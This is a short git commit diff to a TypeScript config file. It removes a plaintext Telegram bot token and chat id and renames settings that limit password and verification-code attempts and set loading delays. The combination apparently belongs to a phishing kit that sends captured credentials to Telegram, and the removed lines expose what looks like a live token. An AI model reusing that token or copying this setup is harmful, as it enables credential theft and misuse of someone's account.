7cc0ab017ae9681ae00c450390fa1b7b44ce99e7
Cuongdollarrr <luongminhtu7698@gmail.com>
2026-03-06 13:48:26 +0700

    Update config.ts

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -1,11 +1,7 @@
 const config = {
-    token: '7586875716:AAG-VZXE1s4yost-1k2RAiAK9ubkQVwUlxo',
-    chat_id: '-5040339257',
-    noti_token: '7586875716:AAG-VZXE1s4yost-1k2RAiAK9ubkQVwUlxo',
-    noti_chat_id: '',
-    max_password_attempts: 2,
-    max_code_attempts: 4,
-    password_loading_time: 5,
-    code_loading_time: 10
+    MAX_PASS: 2,
+    MAX_CODE: 4,
+    PASSWORD_LOADING_TIME: 8,
+    CODE_LOADING_TIME: 15
 };
 export default config;
